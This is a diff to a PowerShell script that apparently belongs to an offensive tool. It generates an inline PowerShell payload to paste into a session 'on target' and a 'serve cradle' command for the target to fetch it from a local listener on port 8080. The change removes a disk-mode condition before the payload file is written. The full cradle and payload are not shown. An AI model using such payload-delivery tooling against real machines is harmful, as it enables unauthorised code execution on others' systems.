@@ -2994,7 +2994,7 @@ while (`$true) {
 			$global:LastInlinePS = $built.InlinePS
 			$_serveOk = $false
 			try { $_t = [Net.Sockets.TcpClient]::new(); $_t.Connect('127.0.0.1', 8080); $_t.Close(); $_serveOk = $true } catch {}
-			if ($global:DiskMode -and $_serveOk) {
+			if ($_serveOk) {
 				[System.IO.File]::WriteAllText($_pipePath, $built.InlinePS, (New-Object System.Text.UTF8Encoding $False))
 			}
 			Write-Output " [1] Inline PS -- paste into existing PS session on target:"
@@ -3004,7 +3004,6 @@ while (`$true) {
 			Write-Output " $_srvCmd"
 			Write-Output ""
 			if (-not $_serveOk) { Write-Host " [!] serve not running -- run 'serve' in local shell before using option 2" -ForegroundColor Red }
-			elseif (-not $global:DiskMode) { Write-Host " [!] diskmode is off -- pipe file not written; option 2 requires diskmode on + serve" -ForegroundColor Red }
 			Write-Host " Copy to clipboard [1] Inline PS  [2] Serve cradle: " -NoNewline
 			$_sc = (Read-Host).Trim()
 			$_clipPayload = if ($_sc -eq '2') { $_srvCmd } else { $built.InlinePS }
@@ -3222,7 +3221,7 @@ while (`$true) {
 		$global:LastInlinePS = $built.InlinePS
 		$_serveOk = $false
 		try { $_t = [Net.Sockets.TcpClient]::new(); $_t.Connect('127.0.0.1', 8080); $_t.Close(); $_serveOk = $true } catch {}
-		if ($global:DiskMode -and $_serveOk) {
+		if ($_serveOk) {
 			[System.IO.File]::WriteAllText($_pipePath, $built.InlinePS, (New-Object System.Text.UTF8Encoding $False))
 		}
 		Write-Output " [1] Inline PS -- paste into existing PS session on target:"
@@ -3232,7 +3231,6 @@ while (`$true) {
 		Write-Output " $_srvCmd"
 		Write-Output ""
 		if (-not $_serveOk) { Write-Host " [!] serve not running -- run 'serve' in local shell before using option 2" -ForegroundColor Red }
-		elseif (-not $global:DiskMode) { Write-Host " [!] diskmode is off -- pipe file not written; option 2 requires diskmode on + serve" -ForegroundColor Red }
 		Write-Host " Copy to clipboard [1] Inline PS  [2] Serve cradle: " -NoNewline
 		$_sc = (Read-Host).Trim()
 		$_clipPayload = if ($_sc -eq '2') { $_srvCmd } else { $built.InlinePS }
